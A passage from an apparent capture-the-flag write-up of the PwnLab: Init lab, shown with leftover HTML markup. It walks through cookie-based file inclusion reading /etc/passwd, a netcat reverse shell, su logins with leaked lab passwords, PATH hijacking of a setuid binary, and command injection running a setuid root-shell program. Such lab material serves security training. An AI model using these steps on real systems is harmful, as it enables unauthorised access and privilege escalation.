<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'>//Multilingual. Not implemented yet.
</span><span class='line'>//setcookie<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>lang<span class="p">&amp;</span>rdquo<span class="p">;</span>,<span class="p">&amp;</span>ldquo<span class="p">;</span>en.lang.php<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$&lt;</span>em&gt;COOKIE<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>lang<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]))</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>    include<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>lang/<span class="p">&amp;</span>rdquo<span class="p">;</span>.<span class="nv">$&lt;</span>/em&gt;COOKIE<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>lang<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">])</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>// Not implemented yet.
</span><span class='line'>?&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://f4l13n5n0w.github.io/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>&lt;?php
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;page&#39;</span><span class="o">]))</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        include<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;page&#39;</span><span class="o">]</span>.<span class="s2">&quot;.php&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="nb">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>?&gt;
</span><span class='line'>&lt;/center&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code of <code>index.php</code>, I noticed another one LFI vulnerability on <code>set cookie</code> header.</p>

<p>so in order to approve this LFI is working, I requested the <code>index.php</code> file and used <code>burp proxy</code> to modify <code>Cookie</code> header as follow:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>GET /index.php HTTP/1.1
</span><span class='line'>Host: 10.1.1.140
</span><span class='line'>User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:45.0<span class="o">)</span> Gecko/20100101 Firefox/45.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,&lt;em&gt;/&lt;/em&gt;<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
</span><span class='line'>Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Cookie: <span class="nv">lang</span><span class="o">=</span>../../../../../../../../../etc/passwd
</span><span class='line'>Connection: close
</span></code></pre></td></tr></table></div></figure></p>

<p>The following response proved that the LFI vulnerability exists and works:</p>

<p><img class="left" src="/downloads/pwnlab_init/3.png"></p>

<p>Now I set up <code>NC</code> to listen on port 443 and then trigger the shell to connect back.</p>

<p><img class="left" src="/downloads/pwnlab_init/4.png"></p>

<p>Great! got in~</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.140<span class="o">]</span> 51503
</span><span class='line'>Linux pwnlab 3.16.0-4-686-pae <span class="c">#1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux</span>
</span><span class='line'> 08:21:09 up <span class="m">1</span> day, 23:06,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>ls -al home
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x  <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 .
</span><span class='line'>drwxr-xr-x <span class="m">21</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 09:13 ..
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> john john <span class="m">4096</span> Mar <span class="m">17</span> 09:57 john
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> kane kane <span class="m">4096</span> Mar <span class="m">17</span> 13:04 kane
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> kent kent <span class="m">4096</span> Mar <span class="m">17</span> 10:06 kent
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> mike mike <span class="m">4096</span> Mar <span class="m">17</span> 15:19 mike
</span><span class='line'><span class="nv">$ </span>ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 00:0c:29:11:ce:27&lt;br/&gt;
</span><span class='line'>          inet addr:10.1.1.140  Bcast:10.1.1.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::20c:29ff:fe11:ce27/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:150222 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:75016 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:11602121 <span class="o">(</span>11.0 MiB<span class="o">)</span>  TX bytes:8154028 <span class="o">(</span>7.7 MiB<span class="o">)</span>
</span><span class='line'>          Interrupt:19 Base address:0x2000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;lo        Link encap:Local Loopback&lt;br/&gt;
</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span><span class='line'>          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0
</span><span class='line'>          RX bytes:100 <span class="o">(</span>100.0 B<span class="o">)</span>  TX bytes:100 <span class="o">(</span>100.0 B<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>During the enumeration phase, I tried the user creditionals collected from the previouse steps:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@pwnlab:/tmp<span class="nv">$ </span>su mike
</span><span class='line'>su mike
</span><span class='line'>Password: SIfdsTEn6I&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;su: Authentication failure
</span><span class='line'>www-data@pwnlab:/tmp<span class="nv">$ </span>su kent
</span><span class='line'>su kent
</span><span class='line'>Password: JWzXuBJJNy&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;kent@pwnlab:/tmp<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span>
</span><span class='line'>kent@pwnlab:/tmp<span class="nv">$ </span><span class="nb">cd</span> /home/kent
</span><span class='line'><span class="nb">cd</span> /home/kent
</span><span class='line'>kent@pwnlab:~<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> kent kent <span class="m">4096</span> Mar <span class="m">17</span> 10:06 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kent kent  <span class="m">220</span> Mar <span class="m">17</span> 10:06 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kent kent <span class="m">3515</span> Mar <span class="m">17</span> 10:06 .bashrc
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kent kent  <span class="m">675</span> Mar <span class="m">17</span> 10:06 .profile
</span><span class='line'>kent@pwnlab:~<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>bash: sudo: <span class="nb">command </span>not found&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;kent@pwnlab:/<span class="nv">$ </span>su kane
</span><span class='line'>su kane
</span><span class='line'>Password: iSv5Ym2GRo&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;kane@pwnlab:/<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span>
</span><span class='line'>kane@pwnlab:/<span class="nv">$ </span><span class="nb">cd</span> /home/kane
</span><span class='line'><span class="nb">cd</span> /home/kane
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 28
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> kane kane <span class="m">4096</span> Mar <span class="m">17</span> 13:04 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane  <span class="m">220</span> Mar <span class="m">17</span> 10:09 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane <span class="m">3515</span> Mar <span class="m">17</span> 10:09 .bashrc
</span><span class='line'>-rwsr-sr-x <span class="m">1</span> mike mike <span class="m">5148</span> Mar <span class="m">17</span> 13:04 msgmike
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane  <span class="m">675</span> Mar <span class="m">17</span> 10:09 .profile
</span><span class='line'>kane@pwnlab:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Both <code>kent</code> and <code>kane</code> can be logged in successfully, but there is interesting file under kane&rsquo;s home directory, <code>msgmike</code> which the <code>setuid</code> bit is set.</p>

<p>By running <code>msgmike</code>, I found it will call system commaned <code>cat</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane@pwnlab:~<span class="nv">$ </span>./msgmike
</span><span class='line'>./msgmike
</span><span class='line'>cat: /home/mike/msg.txt: No such file or directory
</span></code></pre></td></tr></table></div></figure></p>

<p>In order to escape to <code>mike</code>, I create a executable file <code>cat</code> under the local directory and set the environmental variable <code>PATH</code> to include <code>.</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> &lt;br/&gt;
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
</span><span class='line'><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
</span><span class='line'><span class="nb">echo</span> <span class="nv">$PATH</span>
</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span> &gt; cat
</span><span class='line'><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span> &gt; cat
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>chmod +x cat
</span><span class='line'>chmod +x cat
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 32
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> kane kane <span class="m">4096</span> Aug <span class="m">24</span> 08:49 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane  <span class="m">220</span> Mar <span class="m">17</span> 10:09 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane <span class="m">3515</span> Mar <span class="m">17</span> 10:09 .bashrc
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> kane kane   <span class="m">10</span> Aug <span class="m">24</span> 08:49 cat
</span><span class='line'>-rwsr-sr-x <span class="m">1</span> mike mike <span class="m">5148</span> Mar <span class="m">17</span> 13:04 msgmike
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane  <span class="m">675</span> Mar <span class="m">17</span> 10:09 .profile
</span></code></pre></td></tr></table></div></figure></p>

<p>Then run the <code>./msgmike</code> to escape to user <code>mike</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane@pwnlab:~<span class="nv">$ </span>./msgmike
</span><span class='line'>./msgmike
</span><span class='line'>mike@pwnlab:~<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
</span><span class='line'>mike@pwnlab:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After promoted to <code>mike</code>, I found another <code>setuid</code> bit set file <code>msg2root</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 28
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> mike mike <span class="m">4096</span> Mar <span class="m">17</span> 15:19 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> mike mike  <span class="m">220</span> Mar <span class="m">17</span> 10:08 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> mike mike <span class="m">3515</span> Mar <span class="m">17</span> 10:08 .bashrc
</span><span class='line'>-rwsr-sr-x <span class="m">1</span> root root <span class="m">5364</span> Mar <span class="m">17</span> 13:07 msg2root
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> mike mike  <span class="m">675</span> Mar <span class="m">17</span> 10:08 .profile
</span><span class='line'>mike@pwnlab:/home/mike<span class="err">$</span>
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>./msg2root
</span><span class='line'>./msg2root
</span><span class='line'>Message <span class="k">for</span> root: <span class="nb">test</span><span class="p">;</span> id
</span><span class='line'><span class="nb">test</span><span class="p">;</span> id
</span><span class='line'><span class="nb">test</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
</span><span class='line'>mike@pwnlab:/home/mike<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Also I noticed that command injection vulnerability exists.</p>

<p>Then I upload <code>setuid.c</code> file to target server and compile it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/var/www/html/privesc# cat setuid.c&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>stdio.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>stdlib.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>sys/types.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>unistd.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;int main<span class="o">()</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'> setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
</span><span class='line'> system<span class="o">(</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/sh -i<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After compiled <code>setuid.c</code> and run it as injected command to get ROOT.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>gcc -o setuid setuid.c
</span><span class='line'>gcc -o setuid setuid.c
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>ls
</span><span class='line'>ls
</span><span class='line'>boot2root  msg2root  setuid  setuid.c
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>./msg2root
</span><span class='line'>./msg2root
</span><span class='line'>Message <span class="k">for</span> root: id<span class="p">;</span> ./setuid
</span><span class='line'>id<span class="p">;</span> ./setuid
</span><span class='line'>id&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;id&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, got ROOT!!</p>

<p>Time to get FLAG!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
